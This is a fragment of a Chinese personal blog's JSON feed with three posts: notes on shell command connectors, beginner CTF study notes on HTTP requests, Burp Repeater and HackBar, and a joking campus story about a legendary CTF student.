            "content_html": "<h4 id=\"命令连接符\"><a class=\"anchor\" href=\"#命令连接符\">#</a> 命令连接符：</h4>\n<h5 id=\"1-a-b\"><a class=\"anchor\" href=\"#1-a-b\">#</a> 1. a &amp;&amp; b ：</h5>\n<p>代表首先执行前者命令 a 再执行后命令 b，但是前提条件是命令 a 执行正确才会执行命令 b，在 a 执行失败的情况下不会执行 b 命令。所以又被称为短路运算符。</p>\n<blockquote>\n<p>#前面的命令执行成功后，它后面的命令才被执行</p>\n</blockquote>\n<h5 id=\"2-a-b\"><a class=\"anchor\" href=\"#2-a-b\">#</a> 2. a &amp; b：</h5>\n<p>代表首先执行命令 a 再执行命令 b，如果 a 执行失败，还是会继续执行命令 b。也就是说命令 b 的执行不会受到命令 a 的干扰。</p>\n<blockquote>\n<p>#表示简单的拼接，A 命令语句和 B 命令语句没有制约关系</p>\n</blockquote>\n<h5 id=\"3-a-b\"><a class=\"anchor\" href=\"#3-a-b\">#</a> 3. a || b：</h5>\n<p>代表首先执行 a 命令再执行 b 命令，如果 a 命令执行成功，就不会执行 b 命令，相反，如果 a 命令执行不成功，就会执行 b 命令。</p>\n<blockquote>\n<p>#前面的命令执行失败，它后面的命令才被执行</p>\n</blockquote>\n<h5 id=\"4-a-b\"><a class=\"anchor\" href=\"#4-a-b\">#</a> 4. a | b：</h5>\n<p>代表首先执行 a 命令，再执行 b 命令，不管 a 命令成功与否，都会去执行 b 命令。</p>\n<blockquote>\n<p>#当第一条命令失败时，它仍然会执行第二条命令，表示 A 命令语句的输出，作为 B 命令语句的输入执行。</p>\n</blockquote>\n",
            "tags": [
                "发电",
                "发电"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2024/10/11/%E5%9C%9F%E8%B1%86%E7%9B%B4%E6%92%AD%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81/",
            "url": "https://zhewanyiershinicheng.github.io/2024/10/11/%E5%9C%9F%E8%B1%86%E7%9B%B4%E6%92%AD%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81/",
            "title": "土豆直播",
            "date_published": "2024-10-11T09:48:50.000Z",
            "content_html": "<p>土豆直播！！！！！！</p>\n<p>http 请求分为：</p>\n<p>请求头：包括请求方法，版本等</p>\n<p>请求体：</p>\n<p>发给 repeater（重发器）后可以右键改变请求方式，发送请求包。</p>\n<p>User-agent: 检测使用设备类型，windows,android 等。</p>\n<p>post 方法需要加 content-type（在 hacker-bar 中可选）</p>\n<p>​    application/xfu: 是发送 a=2 之类的表单</p>\n<p>​    application/xfu (raw): 可以传图片，文件头（十六进制数）</p>\n<p>​    application/json</p>\n<p>​</p>\n<p>Cookie: 一般是象征身份的随机字符</p>\n<p>xff: 127.0.0.1（ 主机环回地址，可以自己发给自己 ）</p>\n<p>控制台按 F2 可以看到二维数组</p>\n<p>302 是重定向，可以在 repeater 中 follow</p>\n<p>方法：</p>\n<p>get post put delete head (与 GET 相比，没有响应体，只有存活判断)</p>\n<p>可以自定义</p>\n<p>hackerbar 可以发 post 的 json（可选）, 但是方法可以被 bp 再修改</p>\n<p>然后看看 repeater</p>\n<p>能看到的都是前端</p>\n<p>服务器是后端</p>\n<p>F12 可以看源代码（前端）</p>\n<p>ctrl+u 可以看 html</p>\n<p>俩 &lt;scrip&gt; 之间的才是 js，其他都是 html</p>\n<p>html 是大的框架（提供元素），jss 是干正式的 (?)，css 用于美化网页</p>\n<p>js 会看就行（bushi）</p>\n<p>js 重点：</p>\n<p>1. 事件监听（一定要会）</p>\n<p>2. 选取 html 的元素，添加或修改属性值</p>\n<p>3. 创建 html 标签，增加属性，并追加 DOM</p>\n",
            "tags": [
                "技术"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2024/10/11/%E5%9C%9F%E8%B1%86%E8%B1%86%E8%B1%86%E8%B1%86%E8%B1%86/",
            "url": "https://zhewanyiershinicheng.github.io/2024/10/11/%E5%9C%9F%E8%B1%86%E8%B1%86%E8%B1%86%E8%B1%86%E8%B1%86/",
            "title": "土豆豆豆豆豆",
            "date_published": "2024-10-11T09:48:50.000Z",
            "content_html": "<h3 id=\"第一章\"><a class=\"anchor\" href=\"#第一章\">#</a> 第一章</h3>\n<h4 id=\"绪论\"><a class=\"anchor\" href=\"#绪论\">#</a> 绪论</h4>\n<p>这是一个关于土豆佬的故事...... 相传，在 FZU 的计院中，从建立以来，始终有一个以土豆自称的人。有人发现，每一届毕业学生都有关于土豆的印象，而且各不相同。有的人说他是一个打 CTF 的传奇人士，有人说他是一个经常在半夜行动的神秘人士，还有人说他是一个经常出入学校实验室，在里面偷偷搭服务器打 MC 的一个车万人，更可怕的是，虽然大家的印象大不相同，但是有一点是一样的，那就是 ---- 他似乎是某神秘组织的一个队长，没有人知道那是什么组织，但是学校中的种种迹象表明，他们确实存在且有着不可告人的秘密......</p>\n<p>为此，FZU 的学生们自发成立了许多关于土豆的研究组织和调查组织。但是一无所获，直到 2024 届新生的到来......</p>\n<p>“原来如此，就是你了，土豆！”</p>\n<p>“你们大二的前辈都找不到的 Flag, 你不会真的以为，你们能这么轻易的找到吧？”</p>\n<p>&quot; 伟神之于你们，</p>\n<p>就像豆哥之于我们。&quot;</p>\n<p>“难道说，学长你？！”</p>\n<p>“你说的不对，</p>\n<p>-------- 但是很快就会明白的，就在下一届新生来到之前。”</p>\n<hr />\n<p>这是一个关于在 xxxxx 中逐步发现关于土豆真相的故事。</p>\n",
            "tags": [
                "离谱"
            ]
        }
    ]
}